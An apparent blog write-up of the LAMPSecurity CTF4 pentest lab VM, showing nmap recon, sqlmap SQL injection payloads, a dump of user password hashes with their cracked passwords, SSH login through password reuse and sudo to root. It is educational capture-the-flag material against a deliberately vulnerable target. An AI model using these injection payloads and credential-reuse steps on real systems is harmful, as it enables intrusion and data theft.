
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Pentest lab - LAMPSecurity CTF4 - Core dump overflow</title>
  <meta name="author" content="chousensha">

  
  
  <meta name="description" content="Pentesting the LAMPSecurity CTF4 challenge">
  <meta name="keywords" content="lampsecurity, ctf, penetration testing, hacking, security, lampsecurity ctf4, ctf4">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://chousensha.github.io/blog/2016/04/19/pentest-lab-lampsecurity-ctf4">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-51216602-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Core dump overflow</a></h1>
  
    <h2>Core dump in progress...</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:chousensha.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/where-to-start">Where to start</a></li>
  <li><a href="/book-corner">Book corner</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Pentest lab - LAMPSecurity CTF4</h1>
    
    
      <p class="meta">
        








  


<time datetime="2016-04-19T05:40:39-04:00" pubdate data-updated="true">Apr 19<span>th</span>, 2016</time>
        
           | <a href="#disqus_thread"
             data-disqus-identifier="http://chousensha.github.io">Comments</a>
        
      </p>
    
  </header>


<div class="entry-content"><p>Today&rsquo;s target is part of a CTF series by the LAMPSecurity project.</p>

<!-- more -->


<p>The Nmap scan reveals just a few ports:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@pwnbox:~/Downloads#nmap -sS -sV -p1-65535 192.168.80.152
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.49BETA5 ( https://nmap.org ) at 2016-03-02 09:26 EST
</span><span class='line'>Nmap scan report for 192.168.80.152
</span><span class='line'>Host is up, received arp-response (0.00038s latency).
</span><span class='line'>Not shown: 65531 filtered ports, 1 closed port
</span><span class='line'>Reason: 65369 no-responses, 162 host-prohibiteds and 1 reset
</span><span class='line'>PORT   STATE SERVICE REASON         VERSION
</span><span class='line'>22/tcp open  ssh     syn-ack ttl 64 OpenSSH 4.3 (protocol 2.0)
</span><span class='line'>25/tcp open  smtp    syn-ack ttl 64 Sendmail 8.13.5/8.13.5
</span><span class='line'>80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.0 ((Fedora))
</span><span class='line'>MAC Address: 00:0C:29:1D:B6:45 (VMware)
</span><span class='line'>Service Info: Host: ctf4.sas.upenn.edu; OS: Unix</span></code></pre></td></tr></table></div></figure>


<p>Checking out the web server, we can see this page:</p>

<p><img class="center" src="/images/pentest/ctf4/home.png" title="home" alt="home"></p>

<p>Let&rsquo;s get digging!</p>

<h3>Recon</h3>

<p>The Blog section contains some blog posts, for which the URL looks like this: <code><a href="http://192.168.80.152/index.html?page=blog&amp;title=Blog&amp;id=5">http://192.168.80.152/index.html?page=blog&amp;title=Blog&amp;id=5</a></code>. That id parameter calls for SQLi testing and the page parameter could be vulnerable to LFI. But for now, let&rsquo;s keep sniffing around.</p>

<p>One of the things I always do when doing web based challenges is check if there&rsquo;s anything of interest in the <code>robots.txt</code> file. So I did it here as well and I wasn&rsquo;t disappointed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
</span><span class='line'>Disallow: /mail/
</span><span class='line'>Disallow: /restricted/
</span><span class='line'>Disallow: /conf/
</span><span class='line'>Disallow: /sql/
</span><span class='line'>Disallow: /admin/</span></code></pre></td></tr></table></div></figure>


<p>Quite a few places to check! Let&rsquo;s see what we&rsquo;ve got.</p>

<ul>
<li><strong>/mail/</strong></li>
</ul>


<p>This is not your regular mail server:</p>

<p><img class="center" src="/images/pentest/ctf4/squirrel.png" title="squirrelmail" alt="squirrelmail"></p>

<p>I&rsquo;ve never seen this before, so I checked the project&rsquo;s homepage:</p>

<blockquote><p>SquirrelMail is a standards-based webmail package written in PHP. It includes built-in pure PHP support for the IMAP and SMTP protocols, and
all pages render in pure HTML 4.0 (with no JavaScript required) for maximum compatibility across browsers. It has very few requirements and is
very easy to configure and install. SquirrelMail has all the functionality you would want from an email client, including strong MIME support,
address books, and folder manipulation.</p></blockquote>

<p>Ok, will come back to this, for now I&rsquo;m just checking the entire thing for possible entry points.</p>

<ul>
<li><strong>/restricted/</strong></li>
</ul>


<p>Trying to get to this folder will pop up a basic authentication window. Moving on</p>

<ul>
<li><strong>/conf/</strong></li>
</ul>


<p>This one gives an internal server error, but discloses the e-mail address of the server administrator: <code>dstevens@localhost</code></p>

<ul>
<li><strong>/sql/</strong></li>
</ul>


<p>Here we have a directory indexing with a db.sql file that contains the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="n">use</span> <span class="n">ehks</span><span class="p">;</span>
</span><span class='line'><span class="k">create</span> <span class="k">table</span> <span class="k">user</span> <span class="p">(</span><span class="n">user_id</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span> <span class="n">auto_increment</span> <span class="k">primary</span> <span class="k">key</span><span class="p">,</span> <span class="n">user_name</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span> <span class="n">user_pass</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">);</span>
</span><span class='line'><span class="k">create</span> <span class="k">table</span> <span class="n">blog</span> <span class="p">(</span><span class="n">blog_id</span> <span class="nb">int</span> <span class="k">primary</span> <span class="k">key</span> <span class="k">not</span> <span class="k">null</span> <span class="n">auto_increment</span><span class="p">,</span> <span class="n">blog_title</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span> <span class="n">blog_body</span> <span class="nb">text</span><span class="p">,</span> <span class="n">blog_date</span> <span class="n">datetime</span> <span class="k">not</span> <span class="k">null</span><span class="p">);</span>
</span><span class='line'><span class="k">create</span> <span class="k">table</span> <span class="k">comment</span> <span class="p">(</span><span class="n">comment_id</span> <span class="nb">int</span> <span class="k">not</span> <span class="k">null</span> <span class="n">auto_increment</span> <span class="k">primary</span> <span class="k">key</span><span class="p">,</span> <span class="n">comment_title</span> <span class="nb">varchar</span> <span class="p">(</span><span class="mi">50</span><span class="p">),</span> <span class="n">comment_body</span> <span class="nb">text</span><span class="p">,</span> <span class="n">comment_author</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">),</span> <span class="n">comment_url</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">),</span> <span class="n">comment_date</span> <span class="n">datetime</span> <span class="k">not</span> <span class="k">null</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>/admin/</strong></li>
</ul>


<p>And finally, an admin login page.</p>

<p><img class="center" src="/images/pentest/ctf4/admin.png" title="admin" alt="admin"></p>

<p>Also, the search functionality is vulnerable to XSS! Ok, we have enough information to start poking deeper.</p>

<h3>Getting in</h3>

<p>First thing I tried was to put a quote in the id parameter, and a SQL error popped up:  <em>Warning: mysql_fetch_row(): supplied argument is not a valid MySQL result resource in /var/www/html/pages/blog.php on line 20</em>. Time to fire Sqlmap!</p>

<p>First, I enumerated the available databases:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.80.152/index.html?page=blog&title=Blog&id=2" -p "id" --dbms=MySQL --dbs
</span><span class='line'>
</span><span class='line'>[06:05:45] [INFO] testing connection to the target URL
</span><span class='line'>sqlmap resumed the following injection point(s) from stored session:
</span><span class='line'>---
</span><span class='line'>Parameter: id (GET)
</span><span class='line'>    Type: boolean-based blind
</span><span class='line'>    Title: AND boolean-based blind - WHERE or HAVING clause
</span><span class='line'>    Payload: page=blog&title=Blog&id=2 AND 4151=4151
</span><span class='line'>
</span><span class='line'>    Type: AND/OR time-based blind
</span><span class='line'>    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)
</span><span class='line'>    Payload: page=blog&title=Blog&id=2 AND (SELECT * FROM (SELECT(SLEEP(5)))tueL)
</span><span class='line'>
</span><span class='line'>    Type: UNION query
</span><span class='line'>    Title: Generic UNION query (NULL) - 5 columns
</span><span class='line'>    Payload: page=blog&title=Blog&id=2 UNION ALL SELECT NULL,NULL,CONCAT(0x716a7a7671,0x61536d554d5745557253,0x7162716a71),NULL,NULL-- 
</span><span class='line'>---
</span><span class='line'>[06:05:45] [INFO] testing MySQL
</span><span class='line'>[06:05:45] [INFO] confirming MySQL
</span><span class='line'>[06:05:45] [INFO] the back-end DBMS is MySQL
</span><span class='line'>web server operating system: Linux Fedora 5 (Bordeaux)
</span><span class='line'>web application technology: Apache 2.2.0, PHP 5.1.2
</span><span class='line'>back-end DBMS: MySQL &gt;= 5.0.0
</span><span class='line'>[06:05:45] [INFO] fetching database names
</span><span class='line'>available databases [6]:
</span><span class='line'>[*] calendar
</span><span class='line'>[*] ehks
</span><span class='line'>[*] information_schema
</span><span class='line'>[*] mysql
</span><span class='line'>[*] roundcubemail
</span><span class='line'>[*] test</span></code></pre></td></tr></table></div></figure>


<p>I then looked at the ehks database, the interesting table contains usernames and password hashes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Database: ehks
</span><span class='line'>Table: user
</span><span class='line'>[6 entries]
</span><span class='line'>+---------+-----------+----------------------------------+
</span><span class='line'>| user_id | user_name | user_pass                        |
</span><span class='line'>+---------+-----------+----------------------------------+
</span><span class='line'>| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 |
</span><span class='line'>| 2       | achen     | b46265f1e7faa3beab09db5c28739380 |
</span><span class='line'>| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 |
</span><span class='line'>| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 |
</span><span class='line'>| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 |
</span><span class='line'>| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f |
</span><span class='line'>+---------+-----------+----------------------------------+</span></code></pre></td></tr></table></div></figure>


<p>I cracked the MD5 hashes with an online tool, behold the passwords!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dstevens: ilike2surf
</span><span class='line'>achen: seventysixers
</span><span class='line'>pmoore: Homesite
</span><span class='line'>jdurbin: Sue1978
</span><span class='line'>sorzek: pacman
</span><span class='line'>ghighland: undone1</span></code></pre></td></tr></table></div></figure>


<p>With dstevens&#8217; credentials I was able to log in both to the mail and admin panel. The admin functionality allows you to create another blog page, which I tested and it works. The mailbox was more interesting, because it was filled with OSSEC HIDS logs of my attacks! Will delete them before I&rsquo;m done, but for now I scrolled all the way to the bottom to find some real mail:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>I'm installing OSSEC v2 on the server - so I also had to install gcc and
</span><span class='line'>binutils.  Just wanted to let you know.
</span><span class='line'>
</span><span class='line'>-- 
</span><span class='line'>Andrew Chen
</span><span class='line'>Unix Administrator
</span><span class='line'>Ehks Data Research Center</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;m thinking this mail is not just for occupying storage, but it&rsquo;s hinting that we&rsquo;ll have to do some binary exploitation on the target..Anyway, there is more mail about the server setup:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Hello all,
</span><span class='line'>
</span><span class='line'>  the server is up and running now and should be able to support most of
</span><span class='line'>our needs.  Don and I are still working on installing a few more patches
</span><span class='line'>and configuring things.  Let us know if you have any problems.  Thanks!
</span><span class='line'>
</span><span class='line'>-- 
</span><span class='line'>Don Stevens
</span><span class='line'>Sr. Unix Admin
</span><span class='line'>Prof. Ehks Data Research Center</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>
</span><span class='line'>
</span><span class='line'>Hey Don,
</span><span class='line'>
</span><span class='line'>  I think I got the server pretty much set up.  I just have to make some
</span><span class='line'>more adjustments.  Unfortunately I couldn't get RoundCube installed
</span><span class='line'>because our version of PHP is too low.  I'll send more updates as I make
</span><span class='line'>them.
</span><span class='line'>
</span><span class='line'>-- 
</span><span class='line'>James Durbin
</span><span class='line'>Webmaster
</span><span class='line'>Prof. Ehks Data Research Center</span></code></pre></td></tr></table></div></figure>


<p>There is also mail about a calendar feature that I wasn&rsquo;t aware of:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Hello all,
</span><span class='line'>
</span><span class='line'>  I'd like to announce that the new calendaring software is online.  You
</span><span class='line'>all have accounts that you can log in with, they have the same username
</span><span class='line'>and password as your machine accounts.  Feel free to log into the new
</span><span class='line'>system at http://192.168.0.6/calendar.  Let me know if you have any
</span><span class='line'>problems.
</span><span class='line'>
</span><span class='line'>-- 
</span><span class='line'>Don Stevens</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve almost forgotten to check the <em>/restricted</em> folder, so I next did that. It worked with the pair of <em>pmoore/Homesite</em>. Inside there are 2 text files:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>blog_instructions.txt
</span><span class='line'>
</span><span class='line'>Instructions for Posting to the Blog
</span><span class='line'>====================================
</span><span class='line'>
</span><span class='line'>Just log into the admin section at http://192.168.0.6/admin.
</span><span class='line'>Use your regular machine credentials (username and password).
</span><span class='line'>Once you're logged in click the "Blog" link.
</span><span class='line'>
</span><span class='line'>webmail_instructions.txt  
</span><span class='line'>
</span><span class='line'>Instructions for Webmail
</span><span class='line'>========================
</span><span class='line'>
</span><span class='line'>Browse to the URL http://192.168.0.6/mail
</span><span class='line'>Log in with your regular machine credentials (username and password).
</span><span class='line'>Use webmail ;)
</span><span class='line'>
</span><span class='line'>Let Don or James know if you're having problems.</span></code></pre></td></tr></table></div></figure>


<p>Just stuff we had figured on our own. I checked the PHP version, because of the mail hint, the headers mention it as being 5.1.2. Next I logged in for the calendar:</p>

<p><img class="center" src="/images/pentest/ctf4/calendar.png" title="calendar" alt="calendar"></p>

<p>In the admin tab we can modify some calendar options and add a new user. Nothing too helpful in hacking the target, although I did try a RFI because a Nessus scan I&rsquo;ve run indicated the calendar was vulnerable to <a href="http://www.gulftech.org/advisories/PHP-Calendar%20Arbitrary%20File%20Inclusion/58">arbitrary file inclusion</a>. So the last thing left to try before thinking of more options was to see if I could login to SSH with any of the usernames and passwords I had. And I was able to get in the box from the first try, as dstevens!</p>

<p>I looked around in his home directory, the files related to the site are hosted there. Then I tried to read the <code>/etc/sudoers</code> file, and it worked with sudo and his password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'># User privilege specification
</span><span class='line'>root  ALL=(ALL) ALL
</span><span class='line'>dstevens  ALL=(ALL)   ALL
</span><span class='line'>achen ALL=(ALL)   NOPASSWD:ALL
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Well, look at these privileges! Then it&rsquo;s all the matter of becoming root with a simple <em>su</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[dstevens@ctf4 calendar]$ sudo su -
</span><span class='line'>Password:
</span><span class='line'>[root@ctf4 ~]# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Game over! Although at the beginning there seemed to be multiple web avenues for exploitation, most of them were informational, and it was just the SQL injection that gave the keys to the kingdom. Lax permissions and password reuse facilitated the compromise of the target.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ Q: How do you shoot a blue elephant? A: \
</span><span class='line'>| With a blue-elephant gun.               |
</span><span class='line'>|                                         |
</span><span class='line'>| Q: How do you shoot a pink elephant? A: |
</span><span class='line'>| Twist its trunk until it turns blue,    |
</span><span class='line'>| then shoot it with                      |
</span><span class='line'>|                                         |
</span><span class='line'>\ a blue-elephant gun.                    /
</span><span class='line'> -----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>

      








  


<time datetime="2016-04-19T05:40:39-04:00" pubdate data-updated="true">Apr 19<span>th</span>, 2016</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2016/04/19/pentest-lab-lampsecurity-ctf4/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2016/04/19/pentest-lab-lampsecurity-ctf4/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2016/03/11/pentest-lab-primer/" title="Previous Post: Pentest lab - Primer">&laquo; Pentest lab - Primer</a>
      
      
        <a class="basic-alignment right" href="/blog/2016/04/28/slackware-install-guide/" title="Next Post: Slackware install guide">Slackware install guide &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>whoami</h1>
  <p>switch (interests){<br>
 case INFORMATION SECURITY:<br>
Mostly offensive security, but trying to be well-rounded in everything;<br>
case PYTHON:<br>
Mainly security and sysadmin related scripting;<br>
case LINUX:<br>
Greetings from /dev/null;<br>
case JAPANESE:<br>
Language, anime, samurai;<br>
case MARTIAL ARTS:<br>
If it's fighting I like it;<br>
case MILITARY SCIENCE:<br>
Ancient, medieval, modern;<br>
default: GAMING;}</p>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2017/06/12/bow-before-the-lord-of-the-root/">Bow before the Lord of the Root</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/06/11/automater-kali-linux-tools/">Automater - Kali Linux tools</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/06/10/masscan-kali-linux-tools/">Masscan - Kali Linux tools</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/06/09/quick-shares-with-samba-on-centos/">Quick shares with Samba on CentOS</a>
      </li>
    
      <li class="post">
        <a href="/blog/2017/06/07/lbd-kali-linux-tools/">lbd - Kali Linux tools</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'chousensha',
            count: 5,
            skip_forks: true,
	    skip_repos: [ "chousensha.github.io" ],
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>


<section>
  <h1>Latest Tweets</h1>
  <ul id="tweets">
    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
  </ul>
  
    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
  
</section>

<section>
  <h1>Blogroll</h1>
  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>

</section>

  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2017 - chousensha -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'coredumpoverflow';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://chousensha.github.io/blog/2016/04/19/pentest-lab-lampsecurity-ctf4/';
        var disqus_url = 'http://chousensha.github.io/blog/2016/04/19/pentest-lab-lampsecurity-ctf4/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
